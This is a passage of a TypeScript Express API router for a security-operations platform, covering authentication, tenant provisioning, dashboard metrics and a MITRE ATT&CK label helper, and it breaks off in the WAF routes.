import { Router, Response } from 'express';
import crypto from 'crypto';
import net from 'net';
import { db } from '../database/db';
import { CONFIG } from '../config';
import { signToken, comparePassword, hashPassword } from '../auth/jwt';
import { AuthenticatedRequest } from '../middleware/auth';
import { parseWafEvent, WafIngestPayload } from '../parsers/wafParser';
import { parseFirewallEvent, FirewallIngestPayload } from '../parsers/firewallParser';
import { processSecurityEvent } from '../detectors/threatDetector';
import { calculateSecurityScore } from '../services/securityScoreService';
import { recordAuditLog } from '../services/auditService';
import { pruneStaleApplications, removeApplication } from '../services/applicationInventory';
import { removeOrganization, pruneOrphanedOrganizations } from '../services/organizationInventory';
import { SIEMManager } from '../services/siemService';
import { threatIntelService } from '../services/threatIntelService';
import { collectSystemHealth, HEALTH_KEY_BY_SERVICE } from '../services/systemHealthService';
import { lookupIpLocation } from '../services/geoIpService';
import { SecurityEventBus } from '../utils/eventBus';
import { WafDeploymentService, normalizeWafPattern, serializeWafRule } from '../services/serverWafSync';
import { FirewallDeploymentService } from '../services/firewallDeploy';
import { detectAndSyncServerFirewall } from '../services/firewallDetector';
import {
  addSignature as addMalwareSignature,
  getScan as getMalwareScan,
  listScans as listMalwareScans,
  listSignatures as listMalwareSignatures,
  lookupHash as lookupMalwareHash,
  requestAction as requestMalwareAction,
  scanAndRecord
} from '../services/malwareScanner';
import { getSocTelemetry, processCopilotQuery, deployMitigationRule } from '../services/socCopilotService';
import { getConnectedEndpoints } from '../services/endpointConnectionService';
import {
  createContactMessage,
  getContactChannels,
  listContactMessages,
  updateContactMessageStatus
} from '../services/contactService';
import { getTelemetryAnalytics } from '../services/analyticsService';
import {
  findDuplicateCidr,
  getNetworkRow,
  listNetworks,
  serializeNetwork,
  validateNetworkInput
} from '../services/networkInventory';

export const apiRouter = Router();

function cleanIpOnly(raw?: string): string {
  let s = String(raw || '').trim();
  if (!s) return '0.0.0.0';
  if (s.includes(': ') && !s.includes('::')) {
    const after = s.split(': ').pop()?.trim();
    if (after) s = after;
  } else if (/^[a-zA-Z0-9_-]+:\s*[0-9.]+/.test(s)) {
    s = s.replace(/^[a-zA-Z0-9_-]+:\s*/, '').trim();
  }
  return s;
}

// Application connectivity health probe helper
function probeApplicationHealth(domain: string, port: number = 443, timeoutMs: number = 1800, originIp?: string): Promise<{ status: 'ONLINE' | 'DEGRADED' | 'OFFLINE'; latencyMs: number }> {
  return new Promise((resolve) => {
    // If it's a localhost or internal mock hostname, return healthy or fast response
    if (domain.includes('localhost') || domain.includes('.internal') || (originIp && (originIp.includes('127.0.0.1') || originIp.includes('localhost')))) {
      return resolve({ status: 'ONLINE', latencyMs: 1.2 });
    }

    const start = Date.now();
    const tryTarget = (targetHost: string, isFallback: boolean) => {
      const socket = new net.Socket();
      socket.setTimeout(timeoutMs);

      socket.on('connect', () => {
        const latencyMs = Date.now() - start;
        socket.destroy();
        resolve({ status: latencyMs > 600 ? 'DEGRADED' : 'ONLINE', latencyMs });
      });

      socket.on('timeout', () => {
        socket.destroy();
        if (!isFallback && originIp && originIp !== targetHost) {
          tryTarget(originIp, true);
        } else {
          resolve({ status: 'DEGRADED', latencyMs: timeoutMs });
        }
      });

      socket.on('error', () => {
        socket.destroy();
        if (!isFallback && originIp && originIp !== targetHost) {
          tryTarget(originIp, true);
        } else {
          resolve({ status: 'OFFLINE', latencyMs: 0 });
        }
      });

      try {
        socket.connect(port, targetHost);
      } catch {
        if (!isFallback && originIp && originIp !== targetHost) {
          tryTarget(originIp, true);
        } else {
          resolve({ status: 'OFFLINE', latencyMs: 0 });
        }
      }
    };

    tryTarget(domain, false);
  });
}

// Human-readable category for an event source.
function eventCategory(source?: string): string {
  switch (String(source || '').toLowerCase()) {
    case 'waf':
      return 'WAF';
    case 'firewall':
      return 'Firewall';
    case 'agent':
      return 'Endpoint';
    case 'auth':
      return 'Authentication';
    case 'system':
      return 'System';
    default:
      return 'Security';
  }
}

// MITRE ATT&CK mapping helper
function getMitreAttackMapping(attackType: string) {
  const lower = (attackType || '').toLowerCase();
  if (lower.includes('sql')) {
    return {
      techniqueId: 'T1190',
      techniqueName: 'Exploit Public-Facing Application: SQL Injection',
      tactic: 'Initial Access',
      description: 'Adversary attempts to inject malicious SQL syntax into web application parameters to manipulate underlying database queries.'
    };
  }
  if (lower.includes('xss') || lower.includes('cross-site')) {
    return {
      techniqueId: 'T1059.007',
      techniqueName: 'Command and Scripting Interpreter: JavaScript (XSS)',
      tactic: 'Execution',
      description: 'Adversary executes unauthorized JavaScript payloads within victim client browsers.'
    };
  }
  if (lower.includes('brute') || lower.includes('ssh')) {
    return {
      techniqueId: 'T1110',
      techniqueName: 'Brute Force: Credential Stuffing & Password Guessing',
      tactic: 'Credential Access',
      description: 'Adversary systematically attempts multiple authentication credentials against exposed network services.'
    };
  }
  if (lower.includes('traversal')) {
    return {
      techniqueId: 'T1083',
      techniqueName: 'File and Directory Discovery: Path Traversal',
      tactic: 'Discovery',
      description: 'Adversary leverages dot-dot-slash directory traversal to escape restricted server directory structures.'
    };
  }
  if (lower.includes('bot') || lower.includes('scan') || lower.includes('recon')) {
    return {
      techniqueId: 'T1595',
      techniqueName: 'Active Scanning: Vulnerability & Protocol Reconnaissance',
      tactic: 'Reconnaissance',
      description: 'Adversary scans endpoints to identify running services, vulnerable parameters, and open ports.'
    };
  }
  return {
    techniqueId: 'T1190',
    techniqueName: 'Exploit Public-Facing Application',
    tactic: 'Initial Access',
    description: 'Adversary attempts exploitation of software defects or unauthorized access patterns on public endpoints.'
  };
}

// ----------------------------------------------------------------------
// 1. Health & System
// ----------------------------------------------------------------------
apiRouter.get('/health', (_req, res) => {
  res.json({
    status: 'ok',
    service: 'OAT SECURITY Enterprise Engine',
    environment: CONFIG.NODE_ENV,
    timestamp: new Date().toISOString()
  });
});

// Core defense engine health — derived from live server signals on every call
// so silent or inactive engines are reported as Degraded/Offline instead of a
// static "everything is fine".
apiRouter.get('/system/health', (_req: AuthenticatedRequest, res) => {
  res.json(collectSystemHealth());
});

apiRouter.get('/system/status', (_req: AuthenticatedRequest, res) => {
  const snapshot = collectSystemHealth();
  const healthObj: Record<string, string> = {};
  for (const service of snapshot.services) {
    const key = HEALTH_KEY_BY_SERVICE[service.service_name];
    if (key) healthObj[key] = service.status;
  }

  res.json({
    ...healthObj,
    lastHeartbeat: snapshot.timestamp
  });
});

apiRouter.get('/organizations', (req: AuthenticatedRequest, res) => {
  pruneOrphanedOrganizations();

  // Super Admin can see all organizations to switch between them
  if (req.user && req.user.role === 'Super Admin') {
    const records = db.prepare(`
      SELECT o.id, o.name, o.domain, o.industry, o.tier 
      FROM organizations o
      ORDER BY o.created_at ASC
    `).all() as any[];
    return res.json({ organizations: records });
  }

  // Regular users (e.g. admin, admin2) only see their own organization workspace
  // BUT only if it has at least one enrolled (non-revoked) agent.
  // Workspace orgs created at registration have no agents yet — they should not
  // appear in the Switch Organization dropdown until an endpoint agent enrolls.
  const targetOrgId = req.user?.organizationId || req.organizationId;
  const records = db.prepare(`
    SELECT o.id, o.name, o.domain, o.industry, o.tier 
    FROM organizations o
    WHERE o.id = ?
      AND EXISTS (
        SELECT 1 FROM agents a
        WHERE a.organization_id = o.id
          AND (a.revoked_at IS NULL OR a.revoked_at = '')
      )
  `).all(targetOrgId) as any[];

  res.json({
    organizations: records
  });
});

apiRouter.delete('/organizations/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.params.id;
  if (!orgId) {
    return res.status(400).json({ error: 'Organization ID is required' });
  }

  const success = removeOrganization(orgId, 'Explicitly removed by operator');
  if (!success) {
    return res.status(404).json({ error: 'Organization not found' });
  }

  res.json({ success: true, removed: true, id: orgId });
});

// ----------------------------------------------------------------------
// 2. Authentication & Users
// ----------------------------------------------------------------------
/** Columns returned for the authenticated user payload (camelCase to the client). */
const USER_PAYLOAD_COLUMNS = 'id, organization_id, name, email, role, soc_tier, username, phone, telegram_bot_token, bio, social_url, linkedin_url, github_url, twitter_url, instagram_url, avatar_url, mfa_enabled, last_login';

/** Per-platform social links written by the Edit Profile form. */
const SOCIAL_LINK_FIELDS: Array<{ bodyKey: string; column: string; label: string }> = [
  { bodyKey: 'linkedinUrl', column: 'linkedin_url', label: 'LinkedIn' },
  { bodyKey: 'githubUrl', column: 'github_url', label: 'GitHub' },
  { bodyKey: 'twitterUrl', column: 'twitter_url', label: 'X / Twitter' },
  { bodyKey: 'instagramUrl', column: 'instagram_url', label: 'Instagram' }
];

function buildUserPayload(user: any, org: any) {
  return {
    id: user.id,
    name: user.name,
    email: user.email,
    role: user.role,
    socTier: user.soc_tier || null,
    username: user.username || null,
    phone: user.phone || null,
    telegramBotToken: user.telegram_bot_token || null,
    bio: user.bio || null,
    socialUrl: user.social_url || null,
    linkedinUrl: user.linkedin_url || null,
    githubUrl: user.github_url || null,
    twitterUrl: user.twitter_url || null,
    instagramUrl: user.instagram_url || null,
    avatarUrl: user.avatar_url || null,
    organizationId: user.organization_id,
    organizationName: org?.name || 'Enterprise Org',
    mfaEnabled: !!user.mfa_enabled,
    lastLogin: user.last_login || new Date().toISOString()
  };
}

apiRouter.post('/auth/login', async (req: AuthenticatedRequest, res) => {
  const { email, password } = req.body || {};
  const normalizedEmail = String(email || '').trim().toLowerCase();
  if (!normalizedEmail || typeof password !== 'string' || password.length === 0) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const user = db.prepare('SELECT * FROM users WHERE email = ? OR username = ?').get(normalizedEmail, normalizedEmail) as any;
  if (!user || !user.password_hash) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  const valid = await comparePassword(password, user.password_hash);
  if (!valid) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  // Update last login
  db.prepare("UPDATE users SET last_login = datetime('now') WHERE id = ?").run(user.id);

  const org = db.prepare('SELECT * FROM organizations WHERE id = ?').get(user.organization_id) as any;

  const token = signToken({
    userId: user.id,
    email: user.email,
    role: user.role,
    socTier: user.soc_tier || null,
    organizationId: user.organization_id
  });

  recordAuditLog({
    organizationId: user.organization_id,
    userId: user.id,
    userEmail: user.email,
    role: user.role,
    action: 'User Login',
    resource: 'OAT Web Console',
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  res.json({
    token,
    user: buildUserPayload({ ...user, last_login: new Date().toISOString() }, org)
  });
});

apiRouter.get('/auth/me', (req: AuthenticatedRequest, res) => {
  if (!req.user) {
    return res.status(401).json({ error: 'Unauthenticated' });
  }
  const user = db.prepare(`SELECT ${USER_PAYLOAD_COLUMNS} FROM users WHERE id = ?`).get(req.user.userId) as any;
  if (!user) return res.status(404).json({ error: 'User not found' });

  const org = db.prepare('SELECT * FROM organizations WHERE id = ?').get(user.organization_id) as any;
  res.json({
    user: buildUserPayload(user, org)
  });
});

apiRouter.put('/auth/profile', (req: AuthenticatedRequest, res) => {
  if (!req.user) {
    return res.status(401).json({ error: 'Unauthenticated' });
  }

  const {
    name, avatarUrl, username, phone, telegramBotToken, bio, socialUrl
  } = req.body || {};
  const updates: string[] = [];
  const params: any[] = [];

  if (typeof name === 'string' && name.trim().length > 0) {
    updates.push('name = ?');
    params.push(name.trim());
  }

  if (avatarUrl !== undefined) {
    // 5MB binary encoded as base64 is roughly ~6.7MB
    if (typeof avatarUrl === 'string' && avatarUrl.length > 7.5 * 1024 * 1024) {
      return res.status(400).json({ error: 'Ukuran foto melebihi batas 5 MB.' });
    }
    updates.push('avatar_url = ?');
    params.push(avatarUrl ? String(avatarUrl) : null);
  }

  if (username !== undefined) {
    const value = String(username || '').trim();
    if (value.length > 0 && !/^[a-zA-Z0-9._-]{3,32}$/.test(value)) {
      return res.status(400).json({ error: 'Username harus 3–32 karakter (huruf, angka, titik, garis bawah, strip).' });
    }
    if (value) {
      const taken = db.prepare('SELECT id FROM users WHERE username = ? AND id != ?').get(value, req.user.userId) as any;
      if (taken) {
        return res.status(409).json({ error: 'Username sudah dipakai akun lain.' });
      }
    }
    updates.push('username = ?');
    params.push(value || null);
  }

  if (phone !== undefined) {
    const value = String(phone || '').trim();
    if (value.length > 24) {
      return res.status(400).json({ error: 'Nomor HP maksimal 24 karakter.' });
    }
    updates.push('phone = ?');
    params.push(value || null);
  }

  if (telegramBotToken !== undefined) {
    const value = String(telegramBotToken || '').trim();
    if (value.length > 255) {
      return res.status(400).json({ error: 'API key bot Telegram maksimal 255 karakter.' });
    }
    updates.push('telegram_bot_token = ?');
    params.push(value || null);
  }

  if (bio !== undefined) {
    const value = String(bio || '').trim();
    if (value.length > 500) {
      return res.status(400).json({ error: 'Bio maksimal 500 karakter.' });
    }
    updates.push('bio = ?');
    params.push(value || null);
  }

  if (socialUrl !== undefined) {
    const value = String(socialUrl || '').trim();
    if (value && !/^(https?:\/\/)[^\s]{4,}$/i.test(value)) {
      return res.status(400).json({ error: 'Tautan sosmed harus URL yang valid (diawali http:// atau https://).' });
    }
    updates.push('social_url = ?');
    params.push(value || null);
  }

  for (const field of SOCIAL_LINK_FIELDS) {
    const raw = req.body?.[field.bodyKey];
    if (raw === undefined) continue;
    const value = String(raw || '').trim();
    if (value && !/^(https?:\/\/)[^\s]{4,}$/i.test(value)) {
      return res.status(400).json({ error: `Tautan ${field.label} harus URL yang valid (diawali http:// atau https://).` });
    }
    updates.push(`${field.column} = ?`);
    params.push(value || null);
  }

  if (updates.length > 0) {
    params.push(req.user.userId);
    db.prepare(`UPDATE users SET ${updates.join(', ')} WHERE id = ?`).run(...params);
  }

  const user = db.prepare(`SELECT ${USER_PAYLOAD_COLUMNS} FROM users WHERE id = ?`).get(req.user.userId) as any;
  if (!user) return res.status(404).json({ error: 'User not found' });

  const org = db.prepare('SELECT * FROM organizations WHERE id = ?').get(user.organization_id) as any;

  res.json({
    user: buildUserPayload(user, org)
  });
});

apiRouter.get('/auth/setup-required', (_req, res) => {
  // True while the platform has no provisioned users yet (fresh deployment).
  // The console uses this to allow the first-party onboarding session instead
  // of hard-locking every operator out of an empty database.
  const row = db.prepare('SELECT COUNT(*) as count FROM users').get() as { count: number };
  res.json({ setupRequired: row.count === 0 });
});

apiRouter.post('/auth/setup', async (req, res) => {
  // First-run provisioning. Only reachable while the platform has no users at
  // all: it creates the tenant and its owner account from real operator input
  // so the console has a genuine organization to scope every request to.
  const existing = db.prepare('SELECT COUNT(*) as count FROM users').get() as { count: number };
  if (existing.count > 0) {
    return res.status(409).json({ error: 'Setup already completed. Sign in with a provisioned account.' });
  }

  const { email, password, name, organizationName, domain, industry } = req.body || {};
  const cleanEmail = String(email || '').trim().toLowerCase();
  const cleanName = String(name || '').trim();
  const cleanOrgName = String(organizationName || '').trim();
  const cleanDomain = String(domain || '').trim() || cleanEmail.split('@')[1] || '';
  const cleanIndustry = String(industry || '').trim() || 'Enterprise';

  if (!cleanEmail || !password || !cleanName || !cleanOrgName) {
    return res.status(400).json({ error: 'Name, organization name, corporate email and password are required.' });
  }
  if (String(password).length < 8) {
    return res.status(400).json({ error: 'Password must be at least 8 characters.' });
  }

  const orgId = `org_${crypto.randomUUID().substring(0, 8)}`;
  const userId = `usr_${crypto.randomUUID().substring(0, 8)}`;
  const passwordHash = await hashPassword(String(password));

  // The first endpoint agent may already have provisioned the tenant from the
  // website it protects. Reuse that organization so the console shows one
  // tenant with the monitored website instead of a second, empty one.
  const autoProvisioned = db.prepare('SELECT id FROM organizations ORDER BY created_at ASC LIMIT 1').get() as
    { id: string } | undefined;
  const targetOrgId = autoProvisioned?.id || orgId;

  if (autoProvisioned) {
    db.prepare('UPDATE organizations SET name = ?, domain = ? WHERE id = ?')
      .run(cleanOrgName, cleanDomain, autoProvisioned.id);
  } else {
    db.prepare('INSERT INTO organizations (id, name, domain, industry, tier) VALUES (?, ?, ?, ?, ?)')
      .run(orgId, cleanOrgName, cleanDomain, cleanIndustry, 'Enterprise');
  }
  // The first account is the platform owner: role assignment for every later
  // operator stays with this owner, it is never self-selected at login.
  db.prepare(
    'INSERT INTO users (id, organization_id, name, email, password_hash, role, mfa_enabled) VALUES (?, ?, ?, ?, ?, ?, 0)'
  ).run(userId, targetOrgId, cleanName, cleanEmail, passwordHash, 'Super Admin');

  recordAuditLog({
    organizationId: targetOrgId,
    userId,
    userEmail: cleanEmail,
    role: 'Super Admin',
    action: 'Provision Organization Owner',
    resource: `${cleanOrgName} (${targetOrgId})`,
    resourceId: targetOrgId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  const token = signToken({
    userId,
    email: cleanEmail,
    role: 'Super Admin',
    socTier: null,
    organizationId: targetOrgId
  });

  res.status(201).json({
    token,
    organization: {
      id: targetOrgId,
      name: cleanOrgName,
      domain: cleanDomain,
      industry: cleanIndustry,
      tier: 'Enterprise'
    },
    user: {
      id: userId,
      name: cleanName,
      email: cleanEmail,
      role: 'Super Admin',
      organizationId: targetOrgId,
      organizationName: cleanOrgName,
      mfaEnabled: false,
      lastLogin: new Date().toISOString()
    }
  });
});

/**
 * Self-service operator registration.
 * Every new user registered gets their own dedicated, completely isolated
 * organization (workspace). They will not be merged or shared with any other user.
 */
apiRouter.post('/auth/register', async (req: AuthenticatedRequest, res) => {
  try {
    const { name, email, username, password } = req.body || {};
    const cleanName = String(name || '').trim();
    const cleanEmail = String(email || '').trim().toLowerCase();
    const cleanUsername = username ? String(username).trim().toLowerCase() : cleanEmail.split('@')[0].replace(/[^a-z0-9_-]/g, '');
    const cleanPassword = String(password || '');

    if (!cleanName || !cleanEmail || !cleanPassword) {
      return res.status(400).json({ error: 'Nama lengkap, email, dan kata sandi wajib diisi.' });
    }
    if (cleanPassword.length < 6) {
      return res.status(400).json({ error: 'Kata sandi minimal 6 karakter.' });
    }

    // Check if email or username already taken
    const existing = db.prepare('SELECT id FROM users WHERE email = ? OR username = ?').get(cleanEmail, cleanUsername) as any;
    if (existing) {
      return res.status(409).json({ error: 'Email atau username sudah terdaftar.' });
    }

    // Provision a completely isolated tenant (organization) for this user
    const randomSuffix = crypto.randomUUID().substring(0, 6);
    const orgId = `org_${cleanUsername}_${randomSuffix}`;
    const orgName = `${cleanName}'s Workspace`;
    const orgDomain = cleanEmail.includes('@') ? cleanEmail.split('@')[1] : `${cleanUsername}.internal`;

    db.prepare(`
      INSERT INTO organizations (id, name, domain, industry, tier, created_at)
      VALUES (?, ?, ?, 'Enterprise', 'Standard', UTC_TIMESTAMP())
    `).run(orgId, orgName, orgDomain);

    // Initialize dedicated WAF Policy for this organization
    try {
      db.prepare(`
        INSERT INTO waf_policy (
          id, organization_id, engine_enabled, mode, rate_limit_requests, rate_limit_window_s,
          ip_allowlist, ip_blocklist, geo_block_countries, bot_protection_enabled, sync_to_server, revision, server_status
        ) VALUES (?, ?, 1, 'block', 100, 10, '[]', '[]', '[]', 1, 1, 1, 'ACTIVE')
      `).run(`waf_pol_${orgId}`, orgId);
    } catch (e) {
      console.warn('[Register] Waf policy auto-init warning:', e);
    }

    // Hash password & insert user with role 'Admin' scoped exclusively to their orgId
    const userId = `usr_${cleanUsername}_${randomSuffix}`;
    const passwordHash = await hashPassword(cleanPassword);

    db.prepare(`
      INSERT INTO users (id, organization_id, name, email, username, password_hash, role, soc_tier, mfa_enabled, created_at)
      VALUES (?, ?, ?, ?, ?, ?, 'Admin', NULL, 0, UTC_TIMESTAMP())
    `).run(userId, orgId, cleanName, cleanEmail, cleanUsername, passwordHash);

    const token = signToken({
      userId,
      email: cleanEmail,
      role: 'Admin',
      socTier: null,
      organizationId: orgId
    });

    const orgRow = {
      id: orgId,
      name: orgName,
      domain: orgDomain,
      industry: 'Enterprise',
      tier: 'Standard'
    };

    recordAuditLog({
      organizationId: orgId,
      userId,
      userEmail: cleanEmail,
      role: 'Admin',
      action: 'User Self-Registration',
      resource: `Registered account ${cleanEmail} with isolated workspace ${orgName}`,
      resourceId: orgId,
      ipAddress: req.ip || '127.0.0.1',
      userAgent: req.headers['user-agent']
    });

    res.status(201).json({
      token,
      organization: orgRow,
      user: {
        id: userId,
        name: cleanName,
        email: cleanEmail,
        username: cleanUsername,
        role: 'Admin',
        organizationId: orgId,
        organizationName: orgName,
        mfaEnabled: false,
        lastLogin: new Date().toISOString()
      }
    });
  } catch (err: any) {
    console.error('[Register Error]:', err);
    res.status(500).json({ error: err.message || 'Gagal mendaftarkan akun baru.' });
  }
});

apiRouter.get('/users', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const users = db.prepare('SELECT id, organization_id, name, email, role, soc_tier, mfa_enabled, last_login FROM users WHERE organization_id = ?').all(orgId);
  res.json({ users });
});

// ----------------------------------------------------------------------
// 3. Dashboard Summary & Metrics (100% Real from DB)
// ----------------------------------------------------------------------
apiRouter.get('/dashboard/summary', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';

  const totalRequests = db.prepare('SELECT COUNT(*) as count FROM security_events WHERE organization_id = ?').get(orgId) as { count: number };
  const blockedRequests = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP')").get(orgId) as { count: number };
  const allowedRequests = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND action IN ('ALLOW', 'ALLOWED')").get(orgId) as { count: number };
  const totalThreats = db.prepare('SELECT COUNT(*) as count FROM threats WHERE organization_id = ?').get(orgId) as { count: number };
  const criticalAlerts = db.prepare("SELECT COUNT(*) as count FROM threats WHERE organization_id = ? AND severity = 'Critical' AND status = 'ACTIVE'").get(orgId) as { count: number };
  const totalApps = db.prepare('SELECT COUNT(*) as count FROM applications WHERE organization_id = ?').get(orgId) as { count: number };
  const totalNets = db.prepare('SELECT COUNT(*) as count FROM networks WHERE organization_id = ?').get(orgId) as { count: number };

  const scoreResult = calculateSecurityScore(orgId);

  res.json({
    requests: totalRequests.count,
    blocked: blockedRequests.count,
    allowed: allowedRequests.count,
    threats: totalThreats.count,
    critical: criticalAlerts.count,
    applications: totalApps.count,
    networks: totalNets.count,
    securityScore: scoreResult.score,
    securityScoreStatus: scoreResult.status,
    securityScoreGrade: scoreResult.grade
  });
});

apiRouter.get('/endpoints/status', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || (req.query.org as string) || '';
  const status = getConnectedEndpoints(orgId || undefined);
  res.json(status);
});

apiRouter.get('/dashboard', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const endpointStatus = getConnectedEndpoints(orgId || undefined);

  const totalRequests = db.prepare('SELECT COUNT(*) as count FROM security_events WHERE organization_id = ?').get(orgId) as { count: number };
  const blockedRequests = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP')").get(orgId) as { count: number };
  const activeThreats = db.prepare("SELECT COUNT(*) as count FROM threats WHERE organization_id = ? AND status = 'ACTIVE'").get(orgId) as { count: number };
  const criticalAlerts = db.prepare("SELECT COUNT(*) as count FROM threats WHERE organization_id = ? AND severity = 'Critical' AND status = 'ACTIVE'").get(orgId) as { count: number };
  const totalApps = db.prepare('SELECT COUNT(*) as count FROM applications WHERE organization_id = ?').get(orgId) as { count: number };
  const totalNets = db.prepare('SELECT COUNT(*) as count FROM networks WHERE organization_id = ?').get(orgId) as { count: number };

  const scoreResult = calculateSecurityScore(orgId);

  // Group threats by severity
  const severityRows = db.prepare(`
    SELECT severity, COUNT(*) as count FROM threats
    WHERE organization_id = ?
    GROUP BY severity
  `).all(orgId) as Array<{ severity: string; count: number }>;

  const threatOverview = { critical: 0, high: 0, medium: 0, low: 0 };
  severityRows.forEach(r => {
    const key = r.severity.toLowerCase() as keyof typeof threatOverview;
    if (threatOverview[key] !== undefined) {
      threatOverview[key] = r.count;
    }
  });

  // Recent 5 events mapped to standard client event model.
  const rawRecent = db.prepare(`
    SELECT * FROM security_events
    WHERE organization_id = ?
    ORDER BY timestamp DESC LIMIT 5
  `).all(orgId) as any[];

  const recentEvents = rawRecent.map(r => {
    const cleanIp = cleanIpOnly(r.source_ip);
    const geo = lookupIpLocation(cleanIp);
    return {
      id: r.id,
      timestamp: r.timestamp,
      source: r.source,
      sourceIp: cleanIp,
      sourceCountry: geo.country,
      sourceCountryCode: geo.code,
      destination: r.destination_ip || '10.240.10.1',
      application: r.application || 'Edge Ingress Gateway',
      threat: r.threat_name || `${(r.source || 'SEC').toUpperCase()} Event`,
      category: eventCategory(r.source),
      severity: r.severity || 'Medium',
      action: r.action || 'LOG',
      status: (r.action === 'BLOCK' || r.action === 'BLOCKED' || r.action === 'DENY' || r.action === 'DROP') ? 'Mitigated' : 'Detected',
      uri: r.uri,
      method: r.method,
      protocol: r.protocol,
      port: r.port,
      statusCode: r.status_code,
      payloadSnippet: r.payload_snippet
    };
  });

  // Traffic history — last 60 minutes, one bucket per minute (host-local time).
  // `hour` carries the "HH:MM" minute label; the client renders a continuous
  // 60-minute axis so the recap refreshes visibly every minute.
  let trafficRows = db.prepare(`
    SELECT DATE_FORMAT(DATE_ADD(CAST(REPLACE(LEFT(timestamp, 19), 'T', ' ') AS DATETIME), INTERVAL 7 HOUR), '%H:%i') as hour,
           SUM(CASE WHEN action IN ('ALLOW', 'ALLOWED', 'LOG') THEN 1 ELSE 0 END) as allowed,
           SUM(CASE WHEN action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP') THEN 1 ELSE 0 END) as blocked,
           SUM(CASE WHEN action IN ('CHALLENGE', 'RATE_LIMIT') THEN 1 ELSE 0 END) as suspicious
    FROM security_events
    WHERE organization_id = ?
      AND CAST(REPLACE(LEFT(timestamp, 19), 'T', ' ') AS DATETIME) >= UTC_TIMESTAMP() - INTERVAL 60 MINUTE
    GROUP BY hour
    ORDER BY hour ASC
  `).all(orgId) as any[];

  const isLiveTraffic = trafficRows.length > 0;
  let latestTelemetryTimestamp: string | null = null;

  const latestEventRow = db.prepare(`
    SELECT timestamp FROM security_events
    WHERE organization_id = ?
    ORDER BY timestamp DESC
    LIMIT 1
  `).get(orgId) as { timestamp?: string } | undefined;

  if (latestEventRow?.timestamp) {
    latestTelemetryTimestamp = latestEventRow.timestamp;
  }

  // If there are no events in the last 60 minutes (agent idle/offline),
  // retain and display the latest recorded telemetry snapshot so historical logs do not vanish.
  if (!isLiveTraffic && latestTelemetryTimestamp) {
    trafficRows = db.prepare(`
      SELECT DATE_FORMAT(DATE_ADD(CAST(REPLACE(LEFT(timestamp, 19), 'T', ' ') AS DATETIME), INTERVAL 7 HOUR), '%H:%i') as hour,
             SUM(CASE WHEN action IN ('ALLOW', 'ALLOWED', 'LOG') THEN 1 ELSE 0 END) as allowed,
             SUM(CASE WHEN action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP') THEN 1 ELSE 0 END) as blocked,
             SUM(CASE WHEN action IN ('CHALLENGE', 'RATE_LIMIT') THEN 1 ELSE 0 END) as suspicious
      FROM security_events
      WHERE organization_id = ?
        AND CAST(REPLACE(LEFT(timestamp, 19), 'T', ' ') AS DATETIME) >= CAST(REPLACE(LEFT(?, 19), 'T', ' ') AS DATETIME) - INTERVAL 60 MINUTE
        AND CAST(REPLACE(LEFT(timestamp, 19), 'T', ' ') AS DATETIME) <= CAST(REPLACE(LEFT(?, 19), 'T', ' ') AS DATETIME)
      GROUP BY hour
      ORDER BY hour ASC
    `).all(orgId, latestTelemetryTimestamp, latestTelemetryTimestamp) as any[];

    // If sparse, get the last 60 active recorded minutes
    if (trafficRows.length === 0) {
      const distinctMinutes = db.prepare(`
        SELECT DATE_FORMAT(DATE_ADD(CAST(REPLACE(LEFT(timestamp, 19), 'T', ' ') AS DATETIME), INTERVAL 7 HOUR), '%H:%i') as hour,
               SUM(CASE WHEN action IN ('ALLOW', 'ALLOWED', 'LOG') THEN 1 ELSE 0 END) as allowed,
               SUM(CASE WHEN action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP') THEN 1 ELSE 0 END) as blocked,
               SUM(CASE WHEN action IN ('CHALLENGE', 'RATE_LIMIT') THEN 1 ELSE 0 END) as suspicious
        FROM security_events
        WHERE organization_id = ?
        GROUP BY hour
        ORDER BY MAX(timestamp) DESC
        LIMIT 60
      `).all(orgId) as any[];
      trafficRows = distinctMinutes.reverse();
    }
  }

  res.json({
    metrics: {
      protectedAppsCount: totalApps.count,
      protectedNetworksCount: totalNets.count,
      requestsToday: totalRequests.count,
      blockedRequests: blockedRequests.count,
      activeThreats: activeThreats.count,
      criticalAlerts: criticalAlerts.count,
      securityEventsCount: totalRequests.count,
      securityScore: scoreResult.score
    },
    threatOverview,
    recentEvents,
    trafficHistory: trafficRows,
    isLiveTraffic,
    latestTelemetryTimestamp,
    hasConnectedEndpoints: endpointStatus.hasConnectedEndpoints,
    connectedEndpointsCount: endpointStatus.connectedCount,
    activeEndpoints: endpointStatus.endpoints
  });
});

// ----------------------------------------------------------------------
// 4. Security Score Engine
// ----------------------------------------------------------------------
apiRouter.get('/security-score', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const result = calculateSecurityScore(orgId);
  res.json(result);
});

apiRouter.get('/analytics', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  res.json(getTelemetryAnalytics(orgId));
});


// ----------------------------------------------------------------------
// 5. WAF Module & Rules
// ----------------------------------------------------------------------
apiRouter.get('/waf', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const deployment = WafDeploymentService.getDeployment(orgId);

  const analyticsSince = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
  const totalRequests = db.prepare("SELECT COUNT(*) as count FROM security_events WHERE organization_id = ? AND source = 'waf' AND timestamp >= ?").get(orgId, analyticsSince) as { count: number };
